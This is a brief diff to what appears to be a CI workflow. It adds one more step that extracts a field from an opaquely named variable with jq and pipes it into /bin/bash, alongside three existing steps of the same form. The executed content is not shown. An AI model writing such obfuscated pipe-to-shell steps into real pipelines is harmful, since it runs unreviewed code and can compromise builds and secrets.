@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$c07" | jq -r .zf296 | /bin/bash
           echo $s44690 | jq -r .n3288 | /bin/bash
           echo $ls19 | jq -r .uts8 | /bin/bash
+          echo $uu297 | jq -r .kcli5 | /bin/bash
 
       - name: Save archive
         if: always()
